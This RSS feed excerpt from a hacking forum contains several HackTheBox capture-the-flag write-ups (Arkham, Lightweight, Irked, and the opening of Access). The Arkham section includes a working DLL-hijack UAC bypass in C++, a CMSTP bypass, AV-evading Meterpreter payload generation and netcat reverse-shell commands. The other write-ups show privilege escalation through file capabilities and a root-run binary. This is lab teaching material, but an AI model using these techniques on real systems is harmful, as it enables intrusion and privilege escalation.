<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/9/9bcddc8b4845beb0626a3218dffbfc8da49455ce.png" alt="image" data-base62-sha1="mej3YAHktXIVii1IjzCRLYyDBYa" width="588" height="199"><br>
Now we can start investigating the system further. Batman’s home folder doesn’t contain anything so what’s the purpose in using this account? Well, apparently Batman is actually part of the Administrators group:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/5/5470d5ad5382536a306a4c223e0bc4a34b5ca773.png" alt="image" data-base62-sha1="c2ZQZs136Qj0on0itWrcoqrQgdZ" width="690" height="284"><br>
But trying to access the Administrator folder still results in an access denied error:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/7/74b2b79aae28b4bd6bef47639578572680467e5b.png" alt="image" data-base62-sha1="gEmhKYSMACdoKoF3cmgMKmubvn5" width="414" height="88"><br>
This is because UAC is enabled and doesn’t allow us to use Administrator privileges, we’d need to be in an interactive desktop and click “Yes” on the UAC prompt in order to execute commands that require Administrator permissions.</p>
<hr>
<p><strong>Getting root - the easy way (net use)</strong></p>
<p>I said that the attachment picture is a clear hint of a way to grab the root flag because we can use the same utility shown in Alfred’s screenshot to access it. Because we are already administrators with this account we can use net use and mount the administrator’s folder (or the whole drive) on to another drive and we’ll be able to access it without UAC getting in the way:</p>
<pre><code>$ net use * "\\arkham\users\administrator\desktop" /persistent:no
</code></pre>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/6/6ad0d25d386b088ebe3c5a0936e1b0f8e32dfaf2.png" alt="image" data-base62-sha1="feW0DRLVvZJv6Ad0zkcIdhomNCa" width="690" height="274"></p>
<hr>
<p><strong>Getting root - the real men’s way (UAC bypass)</strong></p>
<p>There are a few currently unpathced UAC bypasses for Windows 10, I tried these two:</p>
<ol>
<li><a href="https://egre55.github.io/system-properties-uac-bypass/" rel="noopener nofollow ugc">https://egre55.github.io/system-properties-uac-bypass/</a></li>
<li><a href="https://0x00-0x00.github.io/research/2018/10/31/How-to-bypass-UAC-in-newer-Windows-versions.html" rel="noopener nofollow ugc">https://0x00-0x00.github.io/research/2018/10/31/How-to-bypass-UAC-in-newer-Windows-versions.html</a></li>
</ol>
<p>And I’m going to demonstrate egre55’s method because in my opinion it’s more fun, even if a little longer. This method abuses the fact that some executables can bypass the UAC prompt thanks to a property found inside the executable’s manifest: “<em>autoElevate</em>”. If set to “true” this allows certain programs to be granted a token of higher integrity without going through the UAC prompt, while other processes stay with a medium integrity security token preventing them from performing any operations where administrator privileges are required. Egre55 found that some of the programs with this property are vulnerable to DLL hijacking and crafting a malicious DLL allows us to execute arbitrary code bypassing UAC. These are the vulnerable programs:</p>
<pre><code>C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe
C:\Windows\SysWOW64\SystemPropertiesComputerName.exe
C:\Windows\SysWOW64\SystemPropertiesHardware.exe
C:\Windows\SysWOW64\SystemPropertiesProtection.exe
C:\Windows\SysWOW64\SystemPropertiesRemote.exe
</code></pre>
<p>They all try to load a library called srrstr.dll from AppData/Local/Microsoft/WindowsApps/, folder which is present in the PATH environment variable and can be written to by normal users:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/2/21961a02cf14b385f842fd62db461c520d07d5a1.png" alt="image" data-base62-sha1="4N7lyG4aZD175rKEH69peYT6RgJ" width="690" height="76"><br>
If we drop a malicious srrstr.dll file in that folder and start one of those programs our code will be executed with elevated privileges. Before we do that we must make sure our shell is in an interactive process, otherwise it won’t work. To do this we need a Meterpreter shell but because Defender will find and delete all default Meterpreter payloads there’s also a bit of AV evasion involved that I’ll solve with <a href="https://github.com/GreatSCT/GreatSCT" rel="noopener nofollow ugc">GreatSCT</a>. To be more specific I’ll be launching Meterpreter via the msbuild method, read more about it <a href="https://www.hackingarticles.in/bypass-application-whitelisting-using-msbuild-exe-multiple-methods/" rel="noopener nofollow ugc">here</a>. Other useful AV evasion solutions that could work in this instance are <a href="https://github.com/Veil-Framework/Veil" rel="noopener nofollow ugc">Veil</a>, <a href="https://github.com/oddcod3/Phantom-Evasion" rel="noopener nofollow ugc">Phantom Evasion</a>, <a href="https://github.com/Genetic-Malware/Ebowla" rel="noopener nofollow ugc">Ebowla</a> and <a href="https://github.com/trustedsec/nps_payload" rel="noopener nofollow ugc">nps_payload</a>.</p>
<p>These are the steps to generate the payload using GreatSCT:</p>
<pre><code>&gt; use Bypass
&gt; use msbuild/meterpreter/rev_tcp.py
&gt; set LHOST 10.10.14.29
&gt; set LPORT 9292
&gt; generate
</code></pre>
<p>GreatSCT will create two different files for us:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/1/1bc1b1e582d78f5da816f4b3640b35270787915b.png" alt="image" data-base62-sha1="3XxSD3MatZyKMC4vIVtVR1Igr8v" width="582" height="206"><br>
payload.xml will be msbuild’s input, while payload.rc is a Metasploit resource file to be opened by msfconsole either with the -r flag or the resource command, and will start a multi handler for us. So let’s download the xml file on Arkham (again with Invoke-WebRequest or “iwk” for short) and then launch msbuild.exe by specifing its absolute path since it’s not in %path%:</p>
<pre><code>C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe msbuild.xml
</code></pre>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/8/8019f8ebe63b2880742dad295ea6fd88f937b03c.png" alt="image" data-base62-sha1="iheLe38FCYJdFpZo6lUsw18prOs" width="690" height="122"><br>
The handler in the meantime catches the incoming connection and starts a Meterpreter session:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/e/e4302307efa79b83a2c63e7bd0b8775e7888f7b1.png" alt="image" data-base62-sha1="wyDZKuBU7Q1z1LKWE0FioBLxxol" width="690" height="285"><br>
Now we can list running processes with ps and select an interactive one (so one with a GUI) to migrate to, explorer.exe is a good example:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/2/20c649103ba7a8f549080375dcaa04638b40541f.png" alt="image" data-base62-sha1="4FW6q8mgfDW8d8Zif2YOUFIWuIL" width="690" height="120"><br>
Now it’s time to craft a DLL. Mine will just start a reverse shell with the same nc.exe we’ve been using over and over again, here’s the C++ code:</p>
<pre><code class="lang-auto">#include &lt;windows.h&gt;

void exploit(void);

BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved)
{
    switch (dwReason)
    {
        case DLL_PROCESS_ATTACH:
            exploit();
    }
    return TRUE;
}

void exploit(void)
{
    PROCESS_INFORMATION pi;
    STARTUPINFO si;
    ZeroMemory(&amp;si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&amp;pi, sizeof(pi));
    char cmd[] = "C:\\tomcat\\apache-tomcat-8.5.37\\bin\\nc.exe -e cmd 10.10.14.29 5555";
    
    CreateProcess(NULL, // No module name (use command line)
        cmd,            // Command line
        NULL,           // Process handle not inheritable
        NULL,           // Thread handle not inheritable
        FALSE,          // Set handle inheritance to FALSE
        0,              // No creation flags
        NULL,           // Use parent's environment block
        NULL,           // Use parent's starting directory
        &amp;si,            // Pointer to STARTUPINFO structure
        &amp;pi );          // Pointer to PROCESS_INFORMATION structure

    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    ExitThread(0);
}
</code></pre>
<p>If you’re interested in knowing more about how it works I suggest reading these two pages: <a href="https://docs.microsoft.com/en-us/windows/win32/dlls/dllmain" rel="noopener nofollow ugc">DllMain</a>, <a href="https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa" rel="noopener nofollow ugc">CreateProcessA</a>. I compiled it using mingw32:</p>
<pre><code>┌─[baud@parrot]─[~/arkham]
└──╼ $i686-w64-mingw32-gcc -shared -o srrstr.dll srrstr.cpp -l ws2_32
</code></pre>
<p>Note: if anyone knows why only the code compiled with i686-w64-mingw32-gcc works on the box and not with x86_64-w64-mingw32-gcc please let me know, because I’m a little confused.  Anyway, drop the DLL in the WindowsApps folder, launch one of the vulnerable programs, and a shell is spawned:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/3/347c9c4d2a7e9ec4bfc1a6ad65bfea72262d525e.png" alt="image" data-base62-sha1="7ujNVJeWDclbKkmCeFqWHlzEIUe" width="690" height="215"><br>
<img src="https://0x00sec.s3.amazonaws.com/original/2X/4/4354d6d08a34686b54777aae82f8dcb187666877.png" alt="image" data-base62-sha1="9BDKXOnnfgs9FSM8oLUAVJ2VwFh" width="550" height="264"><br>
Note that the full path of the program must be specified, this is necessary because there are two different copies of the program on the disk, one in System32 and the other in SysWOW64, apparently the attack only works with the second executable.</p>
<p>The second UAC bypass is easy to pull off as well, it consinsts in downloading a <a href="https://github.com/0xVIC/UAC/blob/master/SendKeys_technique.cs" rel="noopener nofollow ugc">C# source file</a>, compiling it as a DLL on Arkham, loading the DLL into memory from PS, and calling the bypass function from the DLL by giving it a command to run which will inherit higher privileges. <a href="https://oddvar.moe/2017/08/15/research-on-cmstp-exe/" rel="noopener nofollow ugc">Here</a> is explained the bypass that the DLL exploits, which relies on a binary called CMSTP.exe:</p>
<pre><code class="lang-auto"># download the file locally:
Invoke-WebRequest "http://10.10.14.29:9090/bypass.cs" -outfile "./Source.cs"
# compile it as a DLL:
Add-Type -TypeDefinition ([IO.File]::ReadAllText("$pwd\Source.cs")) -ReferencedAssemblies "System.Windows.Forms" -OutputAssembly "CMSTP-UAC-Bypass.dll"
# load the newly compiled DLL into memory:
[Reflection.Assembly]::Load([IO.File]::ReadAllBytes("$pwd\CMSTP-UAC-Bypass.dll"))
# get a reverse shell using nc:
[CMSTPBypass]::Execute("C:\tomcat\apache-tomcat-8.5.37\bin\nc.exe 10.10.14.29 9898 -e cmd.exe")
</code></pre>
<p><a href="https://0x00-0x00.github.io/research/2018/10/31/How-to-bypass-UAC-in-newer-Windows-versions.html" rel="noopener nofollow ugc">(source)</a></p>
<p>This was Arkham, one of the most fun and instructive boxes I’ve done so far. Thank you for reading, I hope you found this post useful.</p>
            <p><small>4 posts - 4 participants</small></p>
            <p><a href="https://0x00sec.org/t/hackthebox-writeup-arkham/15541">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/hackthebox-writeup-arkham/15541</link>
          <pubDate>Sat, 10 Aug 2019 15:08:51 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>No</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-15541</guid>
          <source url="https://0x00sec.org/t/hackthebox-writeup-arkham/15541.rss">HackTheBox Writeup: Arkham</source>
        </item>
        <item>
          <title>HackTheBox LIghtweight write-up</title>
          <dc:creator><![CDATA[vict0ni]]></dc:creator>
          <category>Hackthebox Writeups</category>
          <description><![CDATA[
            <h1>HackTheBox Lightweight</h1>
<p>Heyo nullers <img src="https://0x00sec.org/images/emoji/twitter/smiley.png?v=9" title=":smiley:" class="emoji" alt=":smiley:"><br>
Welcome to my writeup for the recently retired box Lightweight from HackTheBox.<br>
Lightweight was tricky at the beginning. In general, it had:</p>
<ul>
<li>Packet sniffing</li>
<li>LDAP Authentication</li>
<li>Files’ capabilites</li>
</ul>
<p>Portscan:<br>
Nmap showed three open ports, i.e. ssh, http and ldap</p>
<pre><code class="lang-auto">Nmap scan report for 10.10.10.119
Host is up (0.61s latency).
Not shown: 997 filtered ports
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 19:97:59:9a:15:fd:d2:ac:bd:84:73:c4:29:e9:2b:73 (RSA)
|   256 88:58:a1:cf:38:cd:2e:15:1d:2c:7f:72:06:a3:57:67 (ECDSA)
|_  256 31:6c:c1:eb:3b:28:0f:ad:d5:79:72:8f:f5:b5:49:db (EdDSA)
80/tcp  open  http    Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips mod_fcgid/2.3.9 PHP/5.4.16)
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips mod_fcgid/2.3.9 PHP/5.4.16
|_http-title: Lightweight slider evaluation page - slendr
389/tcp open  ldap    OpenLDAP 2.2.X - 2.3.X
| ssl-cert: Subject: commonName=lightweight.htb
| Subject Alternative Name: DNS:lightweight.htb, DNS:localhost, DNS:localhost.localdomain
| Not valid before: 2018-06-09T13:32:51
|_Not valid after:  2019-06-09T13:32:51
|_ssl-date: TLS randomness does not represent time
</code></pre>
<p>On port 80:</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/2X/2/26dfcabf68e47d1860038092258b48bf4aee3166.jpeg" data-download-href="/uploads/short-url/5xTCbRBbgBkYAWlm5WV5XYDKzcO.jpeg?dl=1" title="port 80"><img src="https://0x00sec.s3.amazonaws.com/optimized/2X/2/26dfcabf68e47d1860038092258b48bf4aee3166_2_690x351.jpeg" alt="port 80" data-base62-sha1="5xTCbRBbgBkYAWlm5WV5XYDKzcO" width="690" height="351" srcset="https://0x00sec.s3.amazonaws.com/optimized/2X/2/26dfcabf68e47d1860038092258b48bf4aee3166_2_690x351.jpeg, https://0x00sec.s3.amazonaws.com/optimized/2X/2/26dfcabf68e47d1860038092258b48bf4aee3166_2_1035x526.jpeg 1.5x, https://0x00sec.s3.amazonaws.com/optimized/2X/2/26dfcabf68e47d1860038092258b48bf4aee3166_2_1380x702.jpeg 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/2/26dfcabf68e47d1860038092258b48bf4aee3166_2_10x10.png"></a></div><p></p>
<p>The user page prompt me to login via ssh with my IP as username and password.<br>
So after doing that <s>and taking a hint from <a class="mention" href="https://0x00sec.org/u/pry0cc">@pry0cc</a> and <a class="mention" href="https://0x00sec.org/u/guly">@guly</a></s> I just “listened” to the box for as long as I had to. I ran <code>tcpdump -i lo -A -w inter.pcap</code> on the Lightweight box and then I just browsed the webpage. The status.php was taking quite a time to load, so that was suspicious.</p>
<p>After browsing the website enough, I moved the pcap file to /tmp and transfered it to my local computer with <code>scp 10.10.14.200@10.10.10.119:/tmp/inter.pcap .</code></p>
<p>Opening the file with wireshark, we find that there is an ldap “bind request” from ldapuser2 with <strong>simple authentication</strong>, meaning that the ldapuser2’s password was in plain sight.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/6/b/6b66428c80523a464a43588d51efe416067f92e6.jpeg" data-download-href="/uploads/short-url/fk6bb0LeDUvkUlmVX803wh7yjMW.jpeg?dl=1" title="wire"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/6/b/6b66428c80523a464a43588d51efe416067f92e6_2_690x373.jpeg" alt="wire" data-base62-sha1="fk6bb0LeDUvkUlmVX803wh7yjMW" width="690" height="373" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/6/b/6b66428c80523a464a43588d51efe416067f92e6_2_690x373.jpeg, https://0x00sec.s3.amazonaws.com/optimized/3X/6/b/6b66428c80523a464a43588d51efe416067f92e6_2_1035x559.jpeg 1.5x, https://0x00sec.s3.amazonaws.com/optimized/3X/6/b/6b66428c80523a464a43588d51efe416067f92e6_2_1380x746.jpeg 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/3X/6/b/6b66428c80523a464a43588d51efe416067f92e6_2_10x10.png"></a></div><p></p>
<p>By using it we <code>su</code> to ldapuser2 we get the user flag.</p>
<pre><code class="lang-auto">su ldapuser2
Password: 
[ldapuser2@lightweight ~]$ ls
backup.7z  OpenLDAP-Admin-Guide.pdf  OpenLdap.pdf  user.txt
[ldapuser2@lightweight ~]$  cat user.txt
8a866d3b*******************
</code></pre>
<p>In ldapuser2’s home directory we find a backup.7z file. I transfered it to my local machine like the pcap file only to find out that it was password protected. There I used a script I found <a href="https://gist.github.com/bcoles/421cc413d07cd9ba7855">here</a> which uses john to bruteforce the 7z file. The password was <code>delete</code></p>
<p>There I found some php files, which are the same from the website, only with a twist:<br>
after running <code>cat * | grep user</code> in a desparate move for something valueable, I found that the user is ldapuser1,</p>
<pre><code class="lang-auto">vict0ni@vict0niLaptop:~/Desktop/CTF/HTB/Lightweight/backup$ cat * | grep username
$username = 'ldapuser1';
</code></pre>
<p>so the next logical thing to do is to run <code>cat * | grep password</code>, where we find the ldapuser1’s password</p>
<pre><code class="lang-auto">vict0ni@vic0niLaptop:~/Desktop/CTF/HTB/Lightweight/backup$ cat * | grep password
$password = 'f3ca9d298a553da117442deeb6fa932d';
if ($bind=ldap_bind($ds, $dn, $password)) {
...
...
</code></pre>
<p>Escalating to ldapuser1, like previously with ldapuser2.</p>
<pre><code class="lang-auto">[ldapuser2@lightweight ~]$ su ldapuser1
Password: 
[ldapuser1@lightweight ldapuser2]$ whoami
ldapuser1
</code></pre>
<p>There, root got a bit spoiled to me, because some people where giving away clues inside the box. Specific, one broadcasted the message “openssl is the key”. Kind of a bummer but finding two binaries on the home directory was meaning that the way for root had to do with one of them. So the spoil just saved me a rabbithole. But, please, <strong>don’t</strong> spoil things.</p>
<p>I enumerated the openssl binary I had in front of me. After examing it’s capabilities with <code>getcap -r openssl</code> the output was <code>openssl =ep</code>, which means that it had access to anything.</p>
<p>So to get the root.txt file, one must grab it with openssl, encrypt it and paste it in a directory, then decrypt it to read it, like <code>/home/ldapuser1/openssl enc -base64 -in /root/root.txt -out enc_root</code> and then <code>base64 -d enc_root</code>.<br>
And there is the <em>sweet</em> root flag <img src="https://0x00sec.org/images/emoji/twitter/smiley.png?v=9" title=":smiley:" class="emoji" alt=":smiley:"></p>
<pre><code class="lang-auto">[ldapuser1@lightweight ~]$ /home/ldapuser1/openssl enc -base64 -in /root/root.txt -out enc_root
[ldapuser1@lightweight ~]$ base64 -d enc_root
f1d4e309c*******************
</code></pre>
<p>PS: As <a class="mention" href="https://0x00sec.org/u/prescomm">@PresComm</a> once said: “But if you don’t get a shell and can’t run code, is a system really owned? <img src="https://0x00sec.org/images/emoji/twitter/thinking.png?v=9" title=":thinking:" class="emoji" alt=":thinking:">”.<br>
Searching for some way to get a root shell I came across <a href="https://medium.com/@int0x33/day-44-linux-capabilities-privilege-escalation-via-openssl-with-selinux-enabled-and-enforced-74d2bec02099">this</a> article, where one can rewrite the /etc/shadow file.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/1/108227f7e5845f11e6123c59b317ce1354a228e5.png" alt="vict0ni" width="" height=""></p>
            <p><small>2 posts - 2 participants</small></p>
            <p><a href="https://0x00sec.org/t/hackthebox-lightweight-write-up/13590">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/hackthebox-lightweight-write-up/13590</link>
          <pubDate>Sat, 11 May 2019 15:21:07 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>No</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-13590</guid>
          <source url="https://0x00sec.org/t/hackthebox-lightweight-write-up/13590.rss">HackTheBox LIghtweight write-up</source>
        </item>
        <item>
          <title>HackTheBox Irked writeup</title>
          <dc:creator><![CDATA[vict0ni]]></dc:creator>
          <category>Hackthebox Writeups</category>
          <description><![CDATA[
            <p>Hey nullers. This is my write-up about Irked, a retired machine from HackTheBox, an <strong>awesome</strong> place to practice your skills on infosec.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/b/ba6968b3ed502511ae187c1a3114f6bb9a3009e0.png" alt="Selection_050" data-base62-sha1="qB4E7YajuNS4mifEoBgKdLBQOVW" width="439" height="261"></p>
<p>This is my first ever writeup so feedback is more than welcome</p>
<hr>
<p>I started with what I think 90% of everyone out there starts, an nmap scan.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/0/0da18ba24e71e74b7340ff9844fe06c5987fc6de.png" alt="Selection_039" data-base62-sha1="1WAjD9hKHGmoe1IDXZflbBEAG98" width="690" height="228"></p>
<p>Visiting the website at <a href="http://10.10.10.117/">http://10.10.10.117/</a> we get this content</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/9/942fb2fa3843fe9ed02c27f646ba5b72e3d5bea4.png" alt="web" data-base62-sha1="l8URlVkRJKqf6eXmr2pJSCW3Nti" width="538" height="354"></p>
<p>From the beggining we get the first <em>clue</em>: <strong>IRC</strong>. But my first scan wasn’t satisfying, so I looked a little deeper with <code>nmap -p- 10.10.10.117</code></p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/8/89e8f0422c2eca4f2ab15d8caa76a7f901a6f682.png" alt="Selection_040" data-base62-sha1="jG0tSrUjpeDCScwD0gWa2pORxxE" width="517" height="291"></p>
<p>So there is an open irc port. The website was telling us that the irc was not working correctly, so if we connect to it, we might find something that we can take advantage of.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/1/19e9451f1ee747b9340eca953ecfa2297f67592a.png" alt="Selection_019" data-base62-sha1="3HdImaqqDEev19lyh5HeuZwOcQi" width="690" height="309"></p>
<p>There I spent some time researching what a MOTD file is, but it didn’t help me. So the next step for me is to search for a IRC exploit on Metasploit <s>(skid detected)</s> in a desperate hope for an exploit.<br>
After seeing the results and spending a minute or so, my brain finally started to kick: the specific IRC version (Unreal3.2.8.1) was vulnurable to backdoor command execution</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/9/928352efac555b7914168f0138a7d577a860af25.png" alt="Selection_020" data-base62-sha1="kU74oTAk4wLq0rcCE2zHLy3dgtn" width="690" height="238"></p>
<p>After setting the RHOST <code>set RHOST 10.10.10.117</code> and RPORT <code>set RPORT 6697</code>, I run the exploit</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/d/df1b51b45717f77dddb715dde7ef5ee3b5cb811f.png" alt="Selection_021" data-base62-sha1="vPH0qF6wJHL5hVm22j8qrdpEFcz" width="690" height="354"></p>
<p>Hacker’s voice: <em>I’m in.</em></p>
<p>After navigating through the system I found a user named “djmardov”. In his Documents file there were 2 files: user.txt and .backup. Being only able to read the backup file, I came across this result:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/c/c373dfdbe65d958a17ad5e068b87b59f8c7bd42e.png" alt="Selection_022" data-base62-sha1="rT3mJd1A6SRFBtFYtMQDq7mOwvY" width="690" height="356"></p>
<p>What I understood is that steg stands for <em>steganography</em>, i.e. the way of hiding data within other files. But there must exist an image for this, because most steg challenges that I’ve encountered hide data inside image files. And there was only one image available in the hole machine:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/8/8c93c9cfb23aa9eed18bea4b46e1024af91488c2.jpeg" alt="irked" data-base62-sha1="k3BtOxvByxlwHTT6DObCeArBbRU" width="375" height="375"></p>
<p>For steg challenges that requires extracting information from an image with a password, I either use steghide <code>steghide --extract -sf irked.jpg -p UPupDOWNdownLRlrBAbaSSss</code> or I often visit <a href="https://futureboy.us/stegano/decinput.html">this</a> site. This time, to show something different than the classic steghide, I entered this image with the password on the website and I got the djmardov’s password.</p>
<p>I logged in via ssh and user.txt was patiently waiting for me there.</p>
<pre><code class="lang-auto">jmardov@irked:~/Documents$ cat user.txt
cat user.txt
4a*********
</code></pre>
<p>Now on to root!</p>
<p>My privilage escalation skills are not that great, so for a start I use some standard commands from the <a href="https://0x00sec.org/t/enumeration-for-linux-privilege-escalation/1959">0x00sec forum</a>. After running<br>
<code>find / -perm -g=s -o -perm -u=s -type f 2&gt;/dev/null</code><br>
I came across some binaries that were executed as root.</p>
<p>It took me quite some time to figure this out. An experienced hacker would easily recognize the binaries that stand out in a normal Linux machine.</p>
<p>After testing some binaries I came across the <strong>/usr/bin/viewusers</strong>. After putting it to the test I get this error.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/d/dcf2b73d9b0f586635cb34ec40cebc34201e2289.png" alt="Selection_037" data-base62-sha1="vwB3HmniXjn9KMlMBXRZWV8g2j7" width="690" height="144"></p>
<p>So this particular binary was searching for the /tmp/listusers file and was executing whatever command the file contained. So the solution is to create the /tmp/listusers file and write a command that the binary will execute as root, i.e. <code>cat /root/root.txt</code></p>
<p>After giving the permission to execute the file with <code>chmod +x /usr/bin/viewusers</code> I executed the binary and there’s our flag <img src="https://0x00sec.org/images/emoji/twitter/smiley.png?v=9" title=":smiley:" class="emoji" alt=":smiley:"></p>
<pre><code class="lang-auto">djmardov@irked:~$ echo "cat /root/root.txt" &gt; /tmp/listusers
djmardov@irked:~$ chmod+x /tmp/listusers
djmardov@irked:~$ /usr/bin/viewuser
This application is being devleoped to set and test user permissions
It is still being actively developed
(unknown) :0           2018-11-17 13:54 (:0)
djmardov pts/1        2018-11-17 14:19 (10.10.14.23)
8d8e9*************************
</code></pre>
<p>I think Irked was an easy box . Nevertheless, it taught me to be patient and to read everything line by line.<br>
<em>Thankee</em></p>
            <p><small>3 posts - 3 participants</small></p>
            <p><a href="https://0x00sec.org/t/hackthebox-irked-writeup/13269">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/hackthebox-irked-writeup/13269</link>
          <pubDate>Sat, 27 Apr 2019 15:37:45 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>No</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-13269</guid>
          <source url="https://0x00sec.org/t/hackthebox-irked-writeup/13269.rss">HackTheBox Irked writeup</source>
        </item>
        <item>
          <title>[HTB] SHELL AFFECT - Access - WriteUp</title>
          <dc:creator><![CDATA[Cry0l1t3]]></dc:creator>
          <category>Hackthebox Writeups</category>
          <description><![CDATA[
            <p><img src="https://0x00sec.s3.amazonaws.com/original/2X/9/90946da6acbedac2668b6f64d716d8bac331d5e9.png" alt="0x00sec-Access" data-base62-sha1="kD0LeZbyugt2GPuTsYWbBBZVt1f" width="690" height="225"></p>
<p>Hey buddies!<br>
How are you doing?</p>
<p>This time I will show you how to root the ‘Access’ VM from <a href="https://hackthebox.eu" rel="noopener nofollow ugc">HackTheBox</a>.<br>
Like other topics, I will focus on the methodology and the steps which were required to root the box on your own successfully.</p>
<h1>Table of contents</h1>
<pre><code class="lang-auto">1. Port scanning
2. Port filtering
3. Service enumeration
4. FTP
5. Telnet
6. HTTP
7. Analyse Microsoft Access Database
8. ZIP File extraction
9. Telnet Login
10. Reverse Shell through PowerShell
11. Local enumeration
12. Privilege Escalation
13. Challenge
</code></pre>
<p>Let’s begin.</p>
<h2>1. Ping &amp; Port Scanning</h2>
<p>As always, I like to start to scan the machine just for open ports. We need an overview of our target. Because we don’t know how our target was configured, we should do small steps. So let us ping the machine.</p>
<blockquote>
<p>ping -c 3 10.10.10.98</p>
</blockquote>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/a/a41d6bb8fc06ceb3d5b6da4088d6765a818ae044.png" alt="grafik" data-base62-sha1="npPl0LnGiUMVz3ygWn2CRTOb8B6" width="546" height="189"></p>
<p>Notice the TTL (Time-To-Live) is 127. But what is TTL?<br>
Do some research and try to find out on your own.<br>
<strong>You should practice it!</strong></p>
<p>When you find the information you need, then you can go forward.<br>
<em>But what do we need to know?</em></p>
<p>This is a great question and to become better, and it’s necessary to be able to find the solution on your own. So take a step back and create an overview for yourself. Also, you should ask yourself:<br>
<strong>What do I need?</strong><br>
<strong>What is my goal (for this part!)?</strong></p>
<p>It’s always easy if you see the solution. Every machine looks pretty easy if you know how to root it. <strong>The most difficult part of it is to find a way into it on your own.</strong><br>
So do some research before you continue.</p>
<hr>
<p>Some useful resources you should find are:</p>
<aside class="onebox allowlistedgeneric">
  <header class="source">
      <img src="https://searchnetworking.techtarget.com/favicon.ico" class="site-icon" width="256" height="256">
      <a href="https://searchnetworking.techtarget.com/definition/time-to-live" target="_blank" rel="noopener nofollow ugc">SearchNetworking</a>
  </header>
  <article class="onebox-body">
    <img src="https://0x00sec.s3.amazonaws.com/original/2X/e/e0f0e077d158921e77e8956b2ae5519fc3680e4a.png" class="thumbnail" width="" height="">

<h3><a href="https://searchnetworking.techtarget.com/definition/time-to-live" target="_blank" rel="noopener nofollow ugc">What is time-to-live (TTL)? - Definition from WhatIs.com</a></h3>

<p>Time-to-live (TTL) is a value in an Internet Protocol (IP) packet that limits the lifespan of a packet of data in a computer or network.</p>


  </article>
  <div class="onebox-metadata">
    
    
  </div>
  <div style="clear: both"></div>
</aside>

<aside class="onebox allowlistedgeneric">
  <header class="source">
      <img src="https://www.netresec.com/favicon.ico" class="site-icon" width="128" height="128">
      <a href="https://www.netresec.com/?page=Blog&amp;month=2011-11&amp;post=Passive-OS-Fingerprinting" target="_blank" rel="noopener nofollow ugc">Netresec</a>
  </header>
  <article class="onebox-body">
    <img src="https://0x00sec.s3.amazonaws.com/original/2X/8/82b545cb3027513a42f107454b8c5365eb8b409c.jpeg" class="thumbnail" width="" height="">

<h3><a href="https://www.netresec.com/?page=Blog&amp;month=2011-11&amp;post=Passive-OS-Fingerprinting" target="_blank" rel="noopener nofollow ugc">Passive OS Fingerprinting - NETRESEC Blog</a></h3>

<p>Network traffic from a computer can be analyzed to detect what operating system it is running. This is to a large extent due to differences in how the TCP/IP stack is implemented in various operating systems. We will in this blog post explain the...</p>


  </article>
  <div class="onebox-metadata">
    
    
  </div>
  <div style="clear: both"></div>
</aside>

<aside class="onebox stackexchange">
  <header class="source">
      <a href="https://superuser.com/questions/620304/how-to-identify-which-os-is-running-at-remote-host/620521#620521" target="_blank" rel="noopener nofollow ugc">superuser.com</a>
  </header>
  <article class="onebox-body">
      <a href="https://superuser.com/users/238360/ary" target="_blank" rel="noopener nofollow ugc">
    <img alt="Ary" src="https://0x00sec.s3.amazonaws.com/original/2X/e/e5c34b7de1c34f86a329c19b82e5307f4fee0450.png" class="thumbnail onebox-avatar" width="" height="">
  </a>
<h4>
